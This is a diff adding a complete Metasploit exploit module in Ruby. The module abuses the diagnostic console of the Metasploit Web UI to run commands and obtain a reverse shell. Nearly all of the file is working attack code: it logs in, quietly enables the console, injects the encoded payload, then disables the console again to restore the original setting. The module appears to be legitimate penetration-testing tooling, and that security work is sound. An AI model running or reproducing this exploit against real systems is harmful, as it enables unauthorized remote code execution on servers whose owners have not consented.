@@ -1,0 +1,285 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'Metasploit Web UI Diagnostic Console Command Execution',
+      'Description'   => %q{
+        This module exploits the "diagnostic console" feature in the Metasploit
+        Web UI to obtain a reverse shell.
+
+        The diagnostic console is able to be enabled or disabled by an
+        administrator on Metasploit Pro and by an authenticated user on
+        Metasploit Express and Metasploit Community. When enabled, the
+        diagnostic console provides access to msfconsole via the web interface.
+        An authenticated user can then use the console to execute shell
+        commands.
+
+        NOTE: Valid credentials are required for this module.
+
+        Tested against:
+
+        Metasploit Community 4.1.0,
+        Metasploit Community 4.8.2,
+        Metasploit Community 4.12.0
+      },
+      'Author'        => [ 'Justin Steven' ],    # @justinsteven
+      'License'       => MSF_LICENSE,
+      'Privileged'    => true,
+      'Arch'          => ARCH_CMD,
+      'Payload'       => { 'PayloadType'  => 'cmd' },
+      'Targets'       =>
+        [
+          [ 'Unix',
+            {
+              'Platform'   => [ 'unix' ]
+            }
+          ],
+          [ 'Windows',
+            {
+              'Platform'   => [ 'windows' ]
+            }
+          ]
+        ],
+      'DefaultTarget' => 0,
+      'DisclosureDate'  => 'Aug 23 2016'
+      ))
+
+    register_options(
+      [
+        OptBool.new('SSL', [ true, 'Use SSL', true ]),
+        OptPort.new('RPORT', [ true, '', 3790 ]),
+        OptString.new('TARGETURI', [ true, 'Metasploit Web UI base path', '/' ]),
+        OptString.new('USERNAME', [ true,  'The user to authenticate as' ]),
+        OptString.new('PASSWORD', [ true,  'The password to authenticate with' ])
+      ], self.class)
+  end
+
+  def do_login()
+
+    print_status('Obtaining cookies and authenticity_token')
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'login'),
+    })
+
+    unless res
+      fail_with(Failure::NotFound, 'Failed to retrieve login page')
+    end
+
+    unless res.headers.include?('Set-Cookie') && res.body =~ /name="authenticity_token"\W+.*\bvalue="([^"]*)"/
+      fail_with(Failure::UnexpectedReply, "Couldn't find cookies or authenticity_token. Is TARGETURI set correctly?")
+    end
+
+    authenticity_token = $1
+    session = res.get_cookies
+
+    print_status('Logging in')
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'user_sessions'),
+      'cookie'    => session,
+      'vars_post' =>
+        {
+          'utf8'                    => '\xE2\x9C\x93',
+          'authenticity_token'      => authenticity_token,
+          'user_session[username]'  => datastore['USERNAME'],
+          'user_session[password]'  => datastore['PASSWORD'],
+          'commit'                  => 'Sign in'
+        }
+    })
+
+    unless res
+      fail_with(Failure::NotFound, 'Failed to log in')
+    end
+
+    return res.get_cookies, authenticity_token
+
+  end
+
+  def get_console_status(session)
+
+    print_status('Getting diagnostic console status and profile_id')
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, 'settings'),
+      'cookie'    => session,
+    })
+
+    unless res
+      fail_with(Failure::NotFound, 'Failed to get diagnostic console status or profile_id')
+    end
+
+    unless res.body =~ /\bid="profile_id"\W+.*\bvalue="([^"]*)"/
+      fail_with(Failure::UnexpectedReply, 'Failed to get profile_id')
+    end
+
+    profile_id = $1
+
+    if res.body =~ /<input\W+.*\b(id="allow_console_access"\W+.*\bchecked="checked"|checked="checked"\W+.*\bid="allow_console_access")/
+      console_status = true
+    elsif res.body =~ /<input\W+.*\bid="allow_console_access"/
+      console_status = false
+    else
+      fail_with(Failure::UnexpectedReply, 'Failed to get diagnostic console status')
+    end
+
+    print_good("Console is currently: #{console_status ? 'Enabled' : 'Disabled'}")
+
+    return console_status, profile_id
+
+  end
+
+  def set_console_status(session, authenticity_token, profile_id, new_console_status)
+    print_status("#{new_console_status ? 'Enabling' : 'Disabling'} diagnostic console")
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'settings', 'update_profile'),
+      'cookie'    => session,
+      'vars_post' =>
+        {
+          'utf8'                    => '\xE2\x9C\x93',
+          '_method'                 => 'patch',
+          'authenticity_token'      => authenticity_token,
+          'profile_id'              => profile_id,
+          'allow_console_access'    => new_console_status,
+          'commit'                  => 'Update Settings'
+        }
+    })
+
+    unless res
+      fail_with(Failure::NotFound, 'Failed to set status of diagnostic console')
+    end
+
+  end
+
+  def get_container_id(session, container_label)
+
+    container_label_singular = container_label.gsub(/s$/, "")
+
+    print_status("Getting ID of a valid #{container_label_singular}")
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, container_label),
+      'cookie'    => session,
+    })
+
+    unless res && res.body =~ /\bid="#{container_label_singular}_([^"]*)"/
+      print_warning("Failed to get a valid #{container_label_singular} ID")
+      return
+    end
+
+    container_id = $1
+
+    vprint_good("Got: #{container_id}")
+
+    container_id
+
+  end
+
+  def get_console(session, container_label, container_id)
+
+    print_status('Creating a console, getting its ID and authenticity_token')
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'console'),
+      'cookie'    => session,
+    })
+
+    unless res && res.headers['location']
+      fail_with(Failure::UnexpectedReply, 'Failed to get a console ID')
+    end
+
+    console_id = res.headers['location'].split('/')[-1]
+
+    vprint_good("Got console ID: #{console_id}")
+
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'consoles', console_id),
+      'cookie'    => session,
+    })
+
+    unless res && res.body =~ /console_init\('console', 'console', '([^']*)'/
+      fail_with(Failure::UnexpectedReply, 'Failed to get console authenticity_token')
+    end
+
+    console_authenticity_token = $1
+
+    return console_id, console_authenticity_token
+
+  end
+
+  def run_command(session, container_label, console_authenticity_token, container_id, console_id, command)
+
+    print_status('Running payload')
+
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, container_label, container_id, 'consoles', console_id),
+      'cookie'    => session,
+      'vars_post' =>
+        {
+          'read'                    => 'yes',
+          'cmd'                     => command,
+          'authenticity_token'      => console_authenticity_token,
+          'last_event'              => '0',
+          '_'                       => ''
+        }
+    })
+
+    unless res
+      fail_with(Failure::NotFound, 'Failed to run command')
+    end
+
+  end
+
+  def exploit
+
+    session, authenticity_token = do_login()
+
+    original_console_status, profile_id = get_console_status(session)
+
+    unless original_console_status
+      set_console_status(session, authenticity_token, profile_id, true)
+    end
+
+    if container_id = get_container_id(session, "workspaces")
+      # target calls them "workspaces"
+      container_label = "workspaces"
+    elsif container_id = get_container_id(session, "projects")
+      # target calls them "projects"
+      container_label = "projects"
+    else
+      fail_with(Failure::Unknown, 'Failed to get workspace ID or project ID. Cannot continue.')
+    end
+
+    console_id, console_authenticity_token = get_console(session, container_label,container_id)
+
+    run_command(session, container_label, console_authenticity_token,
+                container_id, console_id, payload.encoded)
+
+    unless original_console_status
+      set_console_status(session, authenticity_token, profile_id, false)
+    end
+
+    handler
+
+  end
+
+end
